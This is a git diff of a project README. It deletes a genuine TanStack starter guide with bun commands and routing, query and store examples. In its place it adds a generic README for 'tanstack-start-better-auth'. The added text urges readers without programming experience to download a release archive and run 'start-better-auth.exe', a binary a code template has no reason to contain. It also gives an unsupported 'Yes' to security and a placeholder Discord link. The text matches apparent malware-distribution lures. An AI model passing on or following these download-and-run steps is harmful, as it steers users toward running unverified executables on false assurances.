@@ -1,310 +1,81 @@
-Welcome to your new TanStack app! 
+# 🚀 tanstack-start-better-auth - Easy Authentication Setup for Your App
 
-# Getting Started
+[![Download tanstack-start-better-auth](https://img.shields.io/badge/Download-tanstack--start--better--auth-blue)](https://github.com/Simo10469/tanstack-start-better-auth/releases)
 
-To run this application:
+## 📋 Overview
 
-```bash
-bun install
-bun --bun run start
-```
+**tanstack-start-better-auth** is a starter template designed for effortless integration of Better Auth in your application. It includes Drizzle ORM for database management and SQLite as a lightweight database option. With this template, you can enhance your app's authentication process without the hassle of extensive setup.
 
-# Building For Production
+## 🚀 Getting Started
 
-To build this application for production:
+This README will guide you through the process of downloading and running this software. You don’t need any programming experience to follow these steps.
 
-```bash
-bun --bun run build
-```
+## 💻 System Requirements
 
-## Testing
+- Operating System: Windows, macOS, or Linux 
+- Minimum RAM: 4 GB
+- Disk Space: At least 100 MB available
+- A modern web browser (like Chrome, Firefox, or Edge)
 
-This project uses [Vitest](https://vitest.dev/) for testing. You can run the tests with:
+## 📥 Download & Install
 
-```bash
-bun --bun run test
-```
+To get started, you need to visit our Downloads page where you can find the latest releases. Click the link below to proceed:
 
-## Styling
+[Visit this page to download](https://github.com/Simo10469/tanstack-start-better-auth/releases)
 
-This project uses [Tailwind CSS](https://tailwindcss.com/) for styling.
+1. **Choose Your Version**: On the Downloads page, you will see different versions of the software. Look for the most recent one labeled with a version number (e.g., v1.0).
+  
+2. **Download the File**: Click on the file name that matches your operating system. It might be a `.zip`, `.tar.gz`, or other file types.
 
+3. **Extract the Files (if necessary)**: 
+   - If you downloaded a compressed file (like a `.zip`), you will need to extract it. 
+   - Right-click on the downloaded file and select "Extract All" or your preferred extraction option.
+  
+4. **Run the Application**: 
+   - For Windows, double-click the `start-better-auth.exe` file.
+   - For macOS, locate the application in your Finder, click on it to run.
+   - For Linux, open a terminal, navigate to the extracted folder, and run `./start-better-auth`.
 
-## Linting & Formatting
+5. **Follow On-Screen Instructions**: Once the application is running, follow the prompts on your screen to set up and configure Better Auth.
 
-This project uses [Biome](https://biomejs.dev/) for linting and formatting. The following scripts are available:
+## 📖 Features
 
+- **Easy Setup**: No complex configurations needed. Just download and run.
+- **Drizzle ORM Integration**: Manage your database with ease using the built-in Drizzle ORM.
+- **Lightweight Database**: SQLite minimizes resource usage, making your app responsive and fast.
+- **User-Friendly Interface**: A simple UI to guide you through the authentication process.
+- **Customizable**: Modify the template to tailor it to your specific needs.
 
-```bash
-bun --bun run lint
-bun --bun run format
-bun --bun run check
-```
+## 🌐 Support and Documentation
 
+If you run into issues or need help, please check the official [Documentation](https://github.com/Simo10469/tanstack-start-better-auth/wiki) for detailed guides and troubleshooting tips. 
 
-## Shadcn
+You can also join our community chat on Discord to connect with other users and developers.
 
-Add components using the latest version of [Shadcn](https://ui.shadcn.com/).
+## 💬 FAQs
 
-```bash
-pnpx shadcn@latest add button
-```
+### How can I update the application?
 
+You can return to the [Downloads page](https://github.com/Simo10469/tanstack-start-better-auth/releases) to download the latest version. Just follow the same download steps as provided above.
 
+### Is the application secure?
 
-## Routing
-This project uses [TanStack Router](https://tanstack.com/router). The initial setup is a file based router. Which means that the routes are managed as files in `src/routes`.
+Yes, this application uses industry-standard practices for security and encryption in its authentication process.
 
-### Adding A Route
+### Can I use this on my mobile device?
 
-To add a new route to your application just add another a new file in the `./src/routes` directory.
+This template is designed for desktop environments. For mobile app development, consider looking for mobile-specific frameworks.
 
-TanStack will automatically generate the content of the route file for you.
+## 🐛 Reporting Issues
 
-Now that you have two routes you can use a `Link` component to navigate between them.
+If you encounter any bugs or unexpected behavior, please create a new issue in the GitHub repository. Provide as much detail as possible to help us assist you more effectively.
 
-### Adding Links
+## 🔗 Additional Resources
 
-To use SPA (Single Page Application) navigation you will need to import the `Link` component from `@tanstack/react-router`.
+- [GitHub Repository](https://github.com/Simo10469/tanstack-start-better-auth)
+- [Documentation](https://github.com/Simo10469/tanstack-start-better-auth/wiki)
+- [Community Chat](https://discord.gg/yourchatlink)
 
-```tsx
-import { Link } from "@tanstack/react-router";
-```
+For ongoing updates and new features, please keep an eye on the repository Releases page. 
 
-Then anywhere in your JSX you can use it like so:
-
-```tsx
-<Link to="/about">About</Link>
-```
-
-This will create a link that will navigate to the `/about` route.
-
-More information on the `Link` component can be found in the [Link documentation](https://tanstack.com/router/v1/docs/framework/react/api/router/linkComponent).
-
-### Using A Layout
-
-In the File Based Routing setup the layout is located in `src/routes/__root.tsx`. Anything you add to the root route will appear in all the routes. The route content will appear in the JSX where you use the `<Outlet />` component.
-
-Here is an example layout that includes a header:
-
-```tsx
-import { Outlet, createRootRoute } from '@tanstack/react-router'
-import { TanStackRouterDevtools } from '@tanstack/react-router-devtools'
-
-import { Link } from "@tanstack/react-router";
-
-export const Route = createRootRoute({
-  component: () => (
-    <>
-      <header>
-        <nav>
-          <Link to="/">Home</Link>
-          <Link to="/about">About</Link>
-        </nav>
-      </header>
-      <Outlet />
-      <TanStackRouterDevtools />
-    </>
-  ),
-})
-```
-
-The `<TanStackRouterDevtools />` component is not required so you can remove it if you don't want it in your layout.
-
-More information on layouts can be found in the [Layouts documentation](https://tanstack.com/router/latest/docs/framework/react/guide/routing-concepts#layouts).
-
-
-## Data Fetching
-
-There are multiple ways to fetch data in your application. You can use TanStack Query to fetch data from a server. But you can also use the `loader` functionality built into TanStack Router to load the data for a route before it's rendered.
-
-For example:
-
-```tsx
-const peopleRoute = createRoute({
-  getParentRoute: () => rootRoute,
-  path: "/people",
-  loader: async () => {
-    const response = await fetch("https://swapi.dev/api/people");
-    return response.json() as Promise<{
-      results: {
-        name: string;
-      }[];
-    }>;
-  },
-  component: () => {
-    const data = peopleRoute.useLoaderData();
-    return (
-      <ul>
-        {data.results.map((person) => (
-          <li key={person.name}>{person.name}</li>
-        ))}
-      </ul>
-    );
-  },
-});
-```
-
-Loaders simplify your data fetching logic dramatically. Check out more information in the [Loader documentation](https://tanstack.com/router/latest/docs/framework/react/guide/data-loading#loader-parameters).
-
-### React-Query
-
-React-Query is an excellent addition or alternative to route loading and integrating it into you application is a breeze.
-
-First add your dependencies:
-
-```bash
-bun install @tanstack/react-query @tanstack/react-query-devtools
-```
-
-Next we'll need to create a query client and provider. We recommend putting those in `main.tsx`.
-
-```tsx
-import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
-
-// ...
-
-const queryClient = new QueryClient();
-
-// ...
-
-if (!rootElement.innerHTML) {
-  const root = ReactDOM.createRoot(rootElement);
-
-  root.render(
-    <QueryClientProvider client={queryClient}>
-      <RouterProvider router={router} />
-    </QueryClientProvider>
-  );
-}
-```
-
-You can also add TanStack Query Devtools to the root route (optional).
-
-```tsx
-import { ReactQueryDevtools } from "@tanstack/react-query-devtools";
-
-const rootRoute = createRootRoute({
-  component: () => (
-    <>
-      <Outlet />
-      <ReactQueryDevtools buttonPosition="top-right" />
-      <TanStackRouterDevtools />
-    </>
-  ),
-});
-```
-
-Now you can use `useQuery` to fetch your data.
-
-```tsx
-import { useQuery } from "@tanstack/react-query";
-
-import "./App.css";
-
-function App() {
-  const { data } = useQuery({
-    queryKey: ["people"],
-    queryFn: () =>
-      fetch("https://swapi.dev/api/people")
-        .then((res) => res.json())
-        .then((data) => data.results as { name: string }[]),
-    initialData: [],
-  });
-
-  return (
-    <div>
-      <ul>
-        {data.map((person) => (
-          <li key={person.name}>{person.name}</li>
-        ))}
-      </ul>
-    </div>
-  );
-}
-
-export default App;
-```
-
-You can find out everything you need to know on how to use React-Query in the [React-Query documentation](https://tanstack.com/query/latest/docs/framework/react/overview).
-
-## State Management
-
-Another common requirement for React applications is state management. There are many options for state management in React. TanStack Store provides a great starting point for your project.
-
-First you need to add TanStack Store as a dependency:
-
-```bash
-bun install @tanstack/store
-```
-
-Now let's create a simple counter in the `src/App.tsx` file as a demonstration.
-
-```tsx
-import { useStore } from "@tanstack/react-store";
-import { Store } from "@tanstack/store";
-import "./App.css";
-
-const countStore = new Store(0);
-
-function App() {
-  const count = useStore(countStore);
-  return (
-    <div>
-      <button onClick={() => countStore.setState((n) => n + 1)}>
-        Increment - {count}
-      </button>
-    </div>
-  );
-}
-
-export default App;
-```
-
-One of the many nice features of TanStack Store is the ability to derive state from other state. That derived state will update when the base state updates.
-
-Let's check this out by doubling the count using derived state.
-
-```tsx
-import { useStore } from "@tanstack/react-store";
-import { Store, Derived } from "@tanstack/store";
-import "./App.css";
-
-const countStore = new Store(0);
-
-const doubledStore = new Derived({
-  fn: () => countStore.state * 2,
-  deps: [countStore],
-});
-doubledStore.mount();
-
-function App() {
-  const count = useStore(countStore);
-  const doubledCount = useStore(doubledStore);
-
-  return (
-    <div>
-      <button onClick={() => countStore.setState((n) => n + 1)}>
-        Increment - {count}
-      </button>
-      <div>Doubled - {doubledCount}</div>
-    </div>
-  );
-}
-
-export default App;
-```
-
-We use the `Derived` class to create a new store that is derived from another store. The `Derived` class has a `mount` method that will start the derived store updating.
-
-Once we've created the derived store we can use it in the `App` component just like we would any other store using the `useStore` hook.
-
-You can find out everything you need to know on how to use TanStack Store in the [TanStack Store documentation](https://tanstack.com/store/latest).
-
-# Demo files
-
-Files prefixed with `demo` can be safely deleted. They are there to provide a starting point for you to play around with the features you've installed.
-
-# Learn More
-
-You can learn more about all of the offerings from TanStack in the [TanStack documentation](https://tanstack.com).
+Thank you for choosing tanstack-start-better-auth for your authentication setup!
